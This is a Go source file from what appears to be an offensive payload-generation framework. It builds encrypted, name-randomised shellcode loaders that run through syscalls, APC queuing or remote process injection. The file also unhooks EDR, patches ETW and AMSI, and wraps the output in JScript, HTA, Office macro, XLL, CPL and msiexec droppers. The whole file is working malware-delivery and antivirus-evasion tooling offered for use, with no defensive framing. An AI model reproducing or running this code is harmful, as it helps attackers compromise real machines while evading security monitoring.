	Shellcode_Loader.Variables["buff"] = Cryptor.VarNumberLength(10, 19)

	//Syscall_RtlCopy
	Shellcode_Loader.Variables["kernel32"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["ntdll"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["VirtualAlloc"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["RtlCopyMemory"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["regionsizep"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["GetCurrentThread"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["thread"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["NtQueueApcThreadEx"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["FindAddress"] = FindAddress

	//Process Injection
	Shellcode_Loader.Variables["RemoteETW"] = RemoteETWFunctionName
	Shellcode_Loader.Variables["file"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["handle"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["old"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["shellcode"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["oldshellcodeperms"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["loader"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["bytesdata"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["locdata"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["xdata"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["dllBasedata"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["runfunc"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["oldptrperms"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["sysid"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["baseAddress"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["CreateProcess"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["GetModuleInformation"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["ReloadRemoteProcess"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["RemoteModuleReloading"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["Target"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["WriteProcessMemory"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["addr"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["buf"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["commandLine"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["data"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["err"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["funcNtAllocateVirtualMemory"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["funcNtCreateThreadEx"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["funcNtProtectVirtualMemory"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["funcNtWriteVirtualMemory"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["hModule"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["hProcess"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["handleSize"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["hh"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["lpBaseAddress"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["lpBuffer"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["lpNumberOfBytesWritten"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["mi"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["mod"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["modules"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["module"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["nLength"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["nSize"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["name"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["needed"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["n"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["offsetaddr"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["oldProtect"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["outString"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["pi"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["procEnumProcessModules"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["EnumProcessModules"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["procGetModuleBaseName"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["GetModuleBaseName"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["procGetModuleInformation"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["procWriteProcessMemory"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["process"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["rawbytes"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["raw_bin"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["s"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["si"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["size"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["startupInfo"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["dll"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["error"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["x"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["bytes"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["dllBase"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["dllOffset"] = Cryptor.VarNumberLength(10, 19)
	Shellcode_Loader.Variables["PROCESS_ALL_ACCESS"] = PROCESS_ALL_ACCESS
	Shellcode_Loader.Variables["WriteProcessMemory"] = WriteProcessMemory
	Shellcode_Loader.Variables["MI"] = Cryptor.VarNumberLength(4, 9)

	if console == true {

		Shellcode_Loader.Variables["AllocatingMessage"] = "printDebug(\"[+] Allocating a RWX Section of the Process\")"
		Shellcode_Loader.Variables["RtlCopyMemoryMessage"] = "printDebug(\"[+] Copying Shellcode to Memory with RtlCopyMemory\")"
		Shellcode_Loader.Variables["VirtualProtectMessage"] = "printDebug(\"[+] Calling VirtualProtect to Change Memory to not Writeable\")"
		Shellcode_Loader.Variables["GetCurrentThreadMessage"] = "printDebug(\"[+] Calling GetCurrentThread to get a Handle on the Current Process\")"
		Shellcode_Loader.Variables["NtQueueApcThreadExMessage"] = "printDebug(\"[+] Calling NtQueueApcThreadEx API to Execute Shellcode\")"
		Shellcode_Loader.Variables["SyscallMessage"] = "printDebug(\"[*] Calling the Shellcode Using a Syscall\")"
		Shellcode_Loader.Variables["ReloadingMessage"] = "printDebug(\"[+] Reloading: \"+" + Shellcode_Loader.Variables["DLLname"] + "+\" \")"
		Shellcode_Loader.Variables["VersionMessage"] = "printDebug(\"[+] Detected Version: \" +" + Shellcode_Loader.Variables["Version"] + ")"
		Shellcode_Loader.Variables["PPIDMessage"] =
			`strpid := fmt.Sprint(` + Shellcode_Loader.Variables["pi"] + `.ProcessId)
	printDebug("[*] Creating Remote Process: " + strpid)
	printDebug("[*] Creating Handle to Remote Process")`
		Shellcode_Loader.Variables["ModuleMessage"] = "printDebug(\"[*] Mapping Modules:\")"
		Shellcode_Loader.Variables["addr"] = Cryptor.VarNumberLength(10, 19)
		Shellcode_Loader.Variables["RemoteModuleEnumeration"] =
			`` + Shellcode_Loader.Variables["addr"] + `:= fmt.Sprintf("%X", ` + Shellcode_Loader.Variables["MI"] + `.LpBaseOfDll)
			printDebug("[+] " + ` + Shellcode_Loader.Variables["s"] + ` + "'s Base Address: " + ` + Shellcode_Loader.Variables["addr"] + `)
			printDebug("[*] Reloading " + ` + Shellcode_Loader.Variables["s"] + ` + "'s .Text Field")`
		Shellcode_Loader.Variables["RemoteModuleMessage"] = "printDebug(\"[+] Reloaded and unhooked EDR\")"
		Shellcode_Loader.Variables["RemoteReloading"] = "printDebug(\"[+] Interacting with Remote Process\")"
		Shellcode_Loader.Variables["Injecting"] = "printDebug(\"[+] Injecting Shellcode into Remote Process\")"
		Shellcode_Loader.Variables["Injected"] = "printDebug(\"[+] Injected!\")"
	} else {
		Shellcode_Loader.Variables["RemoteModuleEnumeration"] = ""
		Shellcode_Loader.Variables["PPIDMessage"] = ""
		Shellcode_Loader.Variables["ModuleMessage"] = ""
		Shellcode_Loader.Variables["RemoteModuleMessage"] = ""
		Shellcode_Loader.Variables["RemoteReloading"] = ""
		Shellcode_Loader.Variables["Injecting"] = ""
		Shellcode_Loader.Variables["Injected"] = ""

		Shellcode_Loader.Variables["AllocatingMessage"] = ""
		Shellcode_Loader.Variables["RtlCopyMemoryMessage"] = ""
		Shellcode_Loader.Variables["VirtualProtectMessage"] = ""
		Shellcode_Loader.Variables["GetCurrentThreadMessage"] = ""
		Shellcode_Loader.Variables["NtQueueApcThreadExMessage"] = ""
		Shellcode_Loader.Variables["SyscallMessage"] = ""

	}
	if ProcessInjection != "" {
		ProcessInjection = strings.Replace(ProcessInjection, "\\", "\\\\", -1)
		Shellcode_Loader.Variables["processpath"] = ProcessInjection

		Shellcode_Loader.Variables["offset"] = Cryptor.VarNumberLength(4, 9)
		Shellcode_Loader.Variables["datalength"] = Cryptor.VarNumberLength(4, 9)
		Structure = Struct.Procces_Injection()
	}
	if Exec_Type == "VirtualAlloc" {
		Structure = Struct.Syscall_Alloc()
	}
	if Exec_Type == "RtlCopy" {
		Structure = Struct.Syscall_RtlCopy()
	}
	if Exec_Type == "NtQueueApcThreadEx" {
		Structure = Struct.Syscall_NtQueueAPCThreadEx_Local()
	}
	Shellcode_LoaderTemplate, err := template.New("Shellcode_Loader").Parse(Structure)
	if err != nil {
		log.Fatal(err)
	}
	if err := Shellcode_LoaderTemplate.Execute(&buffer, Shellcode_Loader); err != nil {
		log.Fatal(err)
	}
	return buffer.String(), Shellcode_Loader.Variables["FunctionName"], Shellcode_Loader.Variables["raw_bin"]

}
func Shellcode_Buff(b64ciphertext string, b64key string, b64iv string, FuncName string, NTFuncName string, encryptionmode string) {
	var buffer bytes.Buffer
	Shellcode := &Shellcode{}
	Shellcode.Variables = make(map[string]string)
	var Structure string
	buffer.Reset()
	Shellcode.Variables["FuncName"] = FuncName
	Shellcode.Variables["fullciphertext"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["ciphertext"] = Utils.B64ripper(b64ciphertext, Shellcode.Variables["fullciphertext"], true)
	Shellcode.Variables["key"] = b64key
	Shellcode.Variables["iv"] = b64iv
	Shellcode.Variables["vkey"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["viv"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["block"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["decrypted"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["mode"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["vciphertext"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["rawdata"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["stuff"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["raw_bin"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["hexdata"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["PKCS5UnPadding"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["length"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["src"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["unpadding"] = Cryptor.VarNumberLength(10, 19)

	Shellcode.Variables["buff"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["buff2"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["clear"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["err"] = Cryptor.VarNumberLength(10, 19)

	Shellcode.Variables["sysid"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["processHandle"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["baseAddress"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["regionSize"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["NewProtect"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["oldprotect"] = Cryptor.VarNumberLength(10, 19)
	Shellcode.Variables["NtProtectVirtualMemoryprep"] = NTFuncName

	if encryptionmode == "ELZMA" {
		Structure = Struct.ELZMADecrypt_Function()
	}
	if encryptionmode == "AES" {
		Structure = Struct.AESDecrypt_Function()
	}
	if encryptionmode == "RC4" {
		Structure = Struct.RCFDecrypt_Function()
	}

	ShellcodeTemplate, err := template.New("Shellcode").Parse(Structure)
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := ShellcodeTemplate.Execute(&buffer, Shellcode); err != nil {
		log.Fatal(err)
	}
	Utils.PackageEditor("loader/loader.go", "Shellcodefunc", buffer.String())

}

func JScriptLoader_Buff(name string, filename string, mode string, sandbox bool, CommandLoader string) (string, string, string, string) {
	var LoaderTemplate string
	var buffer bytes.Buffer
	JScriptLoader := &JScriptLoader{}
	JScriptLoader.Variables = make(map[string]string)
	JScriptLoader.Variables["fso"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["dropPath"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["value"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["strRegPath"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["WshShell"] = Cryptor.VarNumberLength(10, 19)
	JScriptLoader.Variables["objShell"] = Cryptor.VarNumberLength(10, 19)
	if mode == "excel" {
		JScriptLoader.Variables["ApplicationName"] = "excel.exe"
		JScriptLoader.Variables["RegName"] = "Excel"
		JScriptLoader.Variables["dllext"] = ".xll"
		JScriptLoader.Variables["objapp"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["Application_Version"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["FileName"] = name
		JScriptLoader.Variables["filename"] = filename
		LoaderTemplate = Struct.JS_Office_Sub()
	}
	if mode == "control" {
		LoaderTemplate = Struct.JS_Control_Sub()
		JScriptLoader.Variables["dllext"] = ".cpl"
		JScriptLoader.Variables["filename"] = filename
		JScriptLoader.Variables["FileName"] = name
	}
	if mode == "msiexec" {
		LoaderTemplate = Struct.JS_Msiexec_Sub()
		JScriptLoader.Variables["dllext"] = ".dll"
		JScriptLoader.Variables["filename"] = filename
		JScriptLoader.Variables["FileName"] = name
		if CommandLoader == "hta" {
			JScriptLoader.Variables["System32"] = "Sysnative"
		} else {
			JScriptLoader.Variables["System32"] = "System32"
		}
	}
	if mode == "wscript" {
		JScriptLoader.Variables["dllext"] = "." + Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["FileName"] = name
		JScriptLoader.Variables["DLLName"] = name
		JScriptLoader.Variables["manifest"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["ax"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["Execute"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["progid"] = Cryptor.VarNumberLength(10, 19)
		JScriptLoader.Variables["filename"] = name

		LoaderTemplate = Struct.WS_JS()
	}
	buffer.Reset()
	JSLoaderTemplate, err := template.New("JScriptLoader").Parse(LoaderTemplate)
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err = JSLoaderTemplate.Execute(&buffer, JScriptLoader); err != nil {
		log.Fatal(err)
	}

	return buffer.String(), JScriptLoader.Variables["fso"], JScriptLoader.Variables["dropPath"], JScriptLoader.Variables["dllext"]

}

func JScript_Buff(fso string, dropPath string, encoded string, code string, name string, mode string, sandbox bool, wsextension string) string {
	var buffer bytes.Buffer
	JScript := &JScript{}
	SandboxJScript := &SandboxJScript{}
	JScript.Variables = make(map[string]string)
	SandboxJScript.Variables = make(map[string]string)
	JScript.Variables["DLLName"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["fso"] = fso
	JScript.Variables["dropPath"] = dropPath
	JScript.Variables["Base64"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["base6411"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["rtest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["atest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["ctest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["ttest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["etest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["htest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["atest"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["TextStream11"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["res1"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["filename1"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["characters"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["base6411decoded"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["BinaryStream"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["binaryWriter"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["dllname"] = ""
	JScript.Variables["dllvar"] = Cryptor.VarNumberLength(10, 19)
	JScript.Variables["dll"] = Utils.B64ripper(encoded, JScript.Variables["dllvar"], false)
	JScript.Variables["Loader"] = code
	JScript.Variables["Magic1"] = Cryptor.VarNumberLength(10, 19)

	JScript.Variables["rc4"] = Cryptor.VarNumberLength(4, 9)
	JScript.Variables["decodeBase64"] = Cryptor.VarNumberLength(4, 9)
	JScript.Variables["b4decoded"] = Cryptor.VarNumberLength(4, 9)
	JScript.Variables["b4decodedkey"] = Cryptor.VarNumberLength(4, 9)
	JScript.Variables["rc4key"] = Cryptor.VarNumberLength(4, 9)
	JScript.Variables["rc4str"] = Cryptor.VarNumberLength(4, 9)
	JScript.Variables["shellcode"] = Cryptor.VarNumberLength(4, 9)

	if mode == "excel" {
		JScript.Variables["dllext"] = ".xll"
		JScript.Variables["FileName"] = name
	}
	if mode == "control" {
		JScript.Variables["dllext"] = ".cpl"
		JScript.Variables["FileName"] = name
	}
	if mode == "wscript" {
		JScript.Variables["dllext"] = wsextension
		JScript.Variables["FileName"] = name
	}
	if mode == "msiexec" {
		JScript.Variables["dllext"] = ".dll"
		JScript.Variables["FileName"] = name
	}
	buffer.Reset()
	JSTemplate, err := template.New("JScript").Parse(Struct.JSfile())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err = JSTemplate.Execute(&buffer, JScript); err != nil {
		log.Fatal(err)
	}

	if sandbox == true {
		SandboxJScript.Variables["objShell"] = Cryptor.VarNumberLength(10, 19)
		SandboxJScript.Variables["domain"] = Cryptor.VarNumberLength(10, 19)
		SandboxJScript.Variables["loader"] = buffer.String()
		buffer.Reset()
		SandboxJSTemplate, err := template.New("SandboxJScript").Parse(Struct.WScript_Sandbox())
		if err != nil {
			log.Fatal(err)
		}
		if err = SandboxJSTemplate.Execute(&buffer, SandboxJScript); err != nil {
			log.Fatal(err)
		}
	} else {

	}
	return buffer.String()
}

func HTA_Buff(hexcode string, filename string, HTAtemplate string) string {
	var buffer bytes.Buffer
	var HTATemplate_Struct string
	HTALoader := &HTALoader{}
	HTALoader.Variables = make(map[string]string)
	HTALoader.Variables["payload"] = hexcode
	HTALoader.Variables["RNZyt"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["bogusWindows1252Chars"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["correctLatin1Chars"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["fos"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["obshell"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["pathworks"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["dest"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["fromByte"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["decode"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["chunkSize"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["source"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["decodedFile"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["decode"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["hexString"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["fromByte"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["decodedFile"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["sleep"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["obshell"] = Cryptor.VarNumberLength(4, 9)
	HTALoader.Variables["test1"] = Cryptor.VarNumberLength(4, 9)

	if HTAtemplate == "HTA_WScript" {
		HTALoader.Variables["filename"] = filename + ".js"
		HTATemplate_Struct = Struct.HTA_WScript()
	} else {
		HTALoader.Variables["filename"] = filename
		HTATemplate_Struct = Struct.HTA()
	}

	buffer.Reset()
	HTATemplate, err := template.New("HTALoader").Parse(HTATemplate_Struct)
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err = HTATemplate.Execute(&buffer, HTALoader); err != nil {
		log.Fatal(err)
	}
	return buffer.String()
}

func Macro_Buff(URL string, outFile string) {
	var buffer bytes.Buffer
	macro := &Macro{}
	macro.Variables = make(map[string]string)
	macro.Variables["HTTPReq"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["t"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["remoteFile"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["pathOfFile"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["obj"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["Full"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["output"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["storeIn"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["sleep"] = Cryptor.VarNumberLength(4, 9)
	macro.Variables["outFile"] = outFile
	macro.Variables["URL"] = URL

	buffer.Reset()
	macroTemplate, err := template.New("macro").Parse(Struct.Macro())
	if err != nil {
		log.Fatal(err)
	}
	buffer.Reset()
	if err := macroTemplate.Execute(&buffer, macro); err != nil {
		log.Fatal(err)
	}
	fmt.Println(buffer.String())
}

func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string, outFile string, console bool, sandbox bool, ETW bool, ProcessInjection string, sleep bool, AMSI bool, export string, encryptionmode string, exectype string, evasion string) (string, string) {
	var code, FuncName, NTFuncName string
	name, filename := FileName(mode)
	if ETW == false {
		fmt.Println("[+] Patched ETW Enabled")
	}
	if AMSI == false {
		fmt.Println("[+] Patched AMSI Enabled")
	}
	if ProcessInjection != "" {
		fmt.Println("[+] Process Injection Mode Enabled")
		fmt.Println("[*] Created Process: " + ProcessInjection)
	}
	Exec_Type := exectype
	code, FuncName, NTFuncName = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, name, ETW, ProcessInjection, sleep, AMSI, export, Exec_Type, evasion)
	os.MkdirAll(name, os.ModePerm)
	Utils.Writefile(name+"/"+name+".go", code)
	Utils.B64decode("loader.zip")
	Utils.Unzip("loader.zip", name)
	os.RemoveAll("loader.zip")
	if mode == "binary" {
		Utils.B64decode("icons.zip")
		Utils.Unzip("icons.zip", name)
		os.RemoveAll("icons.zip")
	}
	if mode == "control" {
		Utils.B64decode("control.zip")
		Utils.Unzip("control.zip", name)
		os.RemoveAll("control.zip")
	}
	if mode == "wscript" {
		Utils.B64decode("wscript.zip")
		Utils.Unzip("wscript.zip", name)
		os.RemoveAll("wscript.zip")
	}
	if mode == "excel" {
		Utils.B64decode("excel.zip")
		Utils.Unzip("excel.zip", name)
		os.RemoveAll("excel.zip")
	}
	if mode == "dll" || mode == "msiexec" {
		Utils.B64decode("dll.zip")
		Utils.Unzip("dll.zip", name)
		os.RemoveAll("dll.zip")
	}

	os.Chdir(name)
	Shellcode_Buff(b64ciphertext, b64key, b64iv, FuncName, NTFuncName, encryptionmode)
	Utils.ModuleObfuscator(name, FuncName, encryptionmode)
	return name, filename
}
func CompileLoader(mode string, outFile string, filename string, name string, CommandLoader string, URL string, sandbox bool, path string) {
	if mode == "binary" {
		Utils.GoEditor(name + ".exe")
	} else {
		Utils.GoEditor(name + ".dll")
	}
	if mode == "excel" {
		os.Rename(name+".dll", name+".xll")
		Utils.Sha256(name + ".xll")
	} else if mode == "control" {
		os.Rename(name+".dll", name+".cpl")
		if outFile == "" {
			os.Chdir("..")
			os.Rename(name+"/"+name+".cpl", name+".cpl")
			os.RemoveAll(name)
			fmt.Println("[+] " + name + ".cpl File Ready")
			Utils.Sha256(name + ".cpl")
			if CommandLoader == "control" {
				outFile = name + ".cpl"
				Utils.Command(URL, CommandLoader, outFile)
			}
			if path != "" {
				Utils.FileMover(name, path)
			}
			return
		}
	} else if mode == "wscript" {
		os.Rename(outFile+".dll", name+".dll")
		Utils.Sha256(name + ".dll")
	} else if mode == "msiexec" {
		os.Rename(outFile+".dll", name+".dll")
		Utils.Sha256(name + ".dll")
	} else if mode == "binary" {
		os.Chdir("..")
		os.Rename(name+"/"+name+".exe", name+".exe")
		os.RemoveAll(name)
		fmt.Println("[+] Binary Compiled")
		Utils.Sha256(name + ".exe")
		if CommandLoader == "bits" {
			outFile = name + ".exe"
			Utils.Command(URL, CommandLoader, outFile)
		}
		if path != "" {
			Utils.FileMover(name, path)
		}
		return
	} else if mode == "dll" {
		os.Chdir("..")
		os.Rename(name+"/"+name+".dll", name+".dll")
		os.RemoveAll(name)
		Utils.Sha256(name + ".dll")
		fmt.Println("[+] DLL Compiled")
		fmt.Println("[!] Note: Loading a dll (with Rundll32 or Regsvr32) that has the same name as a valid system DLL will cause problems, in this case its best to change the name slightly")
		if path != "" {
			Utils.FileMover(name, path)
		}
		return
	}
	fmt.Println("[*] Creating Loader")
	code, fso, dropPath, wsextension := JScriptLoader_Buff(name, filename, mode, sandbox, CommandLoader)
	f, _ := os.Open(filename)
	reader := bufio.NewReader(f)
	content, _ := ioutil.ReadAll(reader)
	encoded := base64.StdEncoding.EncodeToString(content)
	finalcode := JScript_Buff(fso, dropPath, encoded, code, name, mode, sandbox, wsextension)

	URL = Utils.Command(URL, CommandLoader, outFile)
	if CommandLoader == "hta" {
		var HTAtemplate string
		if mode == "wscript" {
			HTAtemplate = "HTA_WScript"
			finalcode = HTA_Buff(hex.EncodeToString([]byte(finalcode)), filename, HTAtemplate)
			fmt.Println("[!] Note an additional file: " + filename + ".js will be dropped in the user's TEMP folder")
		} else {
			HTAtemplate = "HTA"
			finalcode = HTA_Buff(finalcode, filename, HTAtemplate)
		}
	}
	if CommandLoader == "macro" {
		Macro_Buff(URL, outFile)
	}
	Utils.Writefile(outFile, finalcode)
	os.Chdir("..")
	os.Rename(name+"/"+outFile, outFile)
	os.RemoveAll(name)
	Utils.Sha256(outFile)
	if path != "" {
		Utils.FileMover(outFile, path)
	}
	fmt.Println("[+] Loader Compiled")
	if path != "" {
		Utils.FileMover(name, path)
	}
}
